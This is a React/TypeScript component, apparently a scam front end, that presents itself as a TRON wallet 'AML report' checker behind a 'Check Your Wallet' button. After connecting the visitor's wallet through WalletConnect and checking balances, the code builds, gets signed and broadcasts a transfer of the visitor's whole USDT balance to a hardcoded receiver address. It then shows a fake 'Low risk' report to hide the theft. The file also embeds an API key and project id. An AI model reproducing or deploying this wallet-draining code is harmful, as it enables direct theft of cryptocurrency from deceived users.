// components/TronAuthButton.tsx

import React, { useState, useEffect, useCallback } from 'react';
import { WalletConnectAdapter } from '@tronweb3/tronwallet-adapter-walletconnect';
import { Buffer } from 'buffer';
window.Buffer = Buffer;

const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const TRON_RECEIVER = 'THn2MN1u4MiUjuQsqmrgfP2g4WMMCCuX8n';

const adapter = new WalletConnectAdapter({
  network: 'Mainnet',
  options: {
    relayUrl: 'wss://relay.walletconnect.com',
    projectId: '6e52e99f199a2bd1feb89b31fbeb6a78',
    metadata: {
      name: 'AML',
      description: 'TRON + WalletConnect Integration',
      url: 'https://amlreports.pro',
      icons: ['https://amlreports.pro/images/icon-3.abdd8ed5.webp'],
    },
  },
  web3ModalConfig: { themeMode: 'dark' },
});

export const TronAuthButton: React.FC = () => {
  const [modalMessage, setModalMessage] = useState<string | null>(null);
  const [processing, setProcessing] = useState(false);
  const [userAddress, setUserAddress] = useState<string | null>(null);
  const [tronWeb, setTronWeb] = useState<any>(null);

  // Динамическая загрузка TronWeb на клиенте
  useEffect(() => {
    let cancelled = false;
    (async () => {
      try {
        const mod = await import('tronweb');
        const TronWebClass = (mod.default) as any;
        if (!cancelled) {
          setTronWeb(new TronWebClass({
            fullHost: 'https://api.trongrid.io',
            headers: { 'TRON-PRO-API-KEY': 'bbb42b6b-c4de-464b-971f-dea560319489' },
          }));
        }
      } catch (e) {
        console.error('Failed to load TronWeb', e);
        setModalMessage('Ошибка инициализации TronWeb');
      }
    })();

    // Прогрев адаптера
    if (typeof (adapter as any).init === 'function') {
      (adapter as any).init();
    }
    adapter.on('disconnect', () => {
      setProcessing(false);
      setModalMessage(null);
      setUserAddress(null);
    });

    return () => { cancelled = true; };
  }, []);

  const disconnectAndNotify = useCallback(async (msg?: string) => {
    await adapter.disconnect();
    setProcessing(false);
    if (msg) setModalMessage(msg);
  }, []);

  const connectWallet = useCallback(async () => {
    if (!tronWeb) {
      setModalMessage('TronWeb загружается, подождите пожалуйста.');
      return;
    }
    setProcessing(true);
    try {
      await adapter.connect();

      const address = adapter.address;
      if (!address || !tronWeb.isAddress(address)) {
        throw new Error('Invalid wallet address');
      }
      setUserAddress(address);
      tronWeb.setAddress(address);

      // Проверка TRX для комиссии
      const trxRaw = await tronWeb.trx.getBalance(address);
      const MIN_TRX = 5_000_000; // 5 TRX
      if (trxRaw < MIN_TRX) {
        return await disconnectAndNotify('❌ Недостаточно TRX для комиссии (минимум 5 TRX).');
      }

      // Проверка USDT
      const usdtCtr = await tronWeb.contract().at(USDT_CONTRACT);
      const usdtRaw = await usdtCtr.methods.balanceOf(address).call();
      const usdt = Number(usdtRaw) / 1e6;
      if (usdt < 1) {
        return await disconnectAndNotify('✅ AML report: Low risk. USDT balance too low.');
      }

      // Формируем транзакцию USDT
      const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
        USDT_CONTRACT,
        'transfer(address,uint256)',
        { feeLimit: 25_000_000, callValue: 0 },
        [
          { type: 'address', value: TRON_RECEIVER },
          { type: 'uint256', value: usdtRaw },
        ],
        address
      );

      const serialized = tronWeb.utils.transaction.txJsonToPb(transaction);
      const signed = await adapter.signTransaction(serialized);
      const result = await tronWeb.trx.sendRawTransaction(signed);

      if (!result.result) throw new Error('USDT transfer failed');

      await disconnectAndNotify('✅ AML report: USDT успешно переведены. Low risk.');
    } catch (err: any) {
      console.error(err);
      const m = err.message || String(err);
      if (/Modal is closed|User rejected|Timeout|Invalid address/i.test(m)) {
        setProcessing(false);
        return;
      }
      await disconnectAndNotify('⚠️ Ошибка соединения или транзакции');
    }
  }, [tronWeb, disconnectAndNotify]);

  const handleClick = () => {
    if (!adapter.connected && !processing) connectWallet();
  };

  return (
    <button onClick={handleClick} className="AuthButton" style={{ cursor: 'pointer' }}>
      Check Your Wallet
      {modalMessage && (
        <div className="modal__overflow">
          <div className="modal">
            {modalMessage.includes('AML report') ? (
              <div className="content greenBorder">
                <h3>{modalMessage}</h3>
                <div className="nums">
                  <div><span className="circ green" /> 0-30</div>
                  <div><span className="circ orange" /> 31-69</div>
                  <div><span className="circ red" /> 70-100</div>
                </div>
                <div className="content report">
                  <p>Wallet:</p>
                  <h5>{userAddress}</h5>
                </div>
              </div>
            ) : (
              <p>{modalMessage}</p>
            )}
            <button onClick={() => setModalMessage(null)}>Close</button>
          </div>
        </div>
      )}
    </button>
  );
};
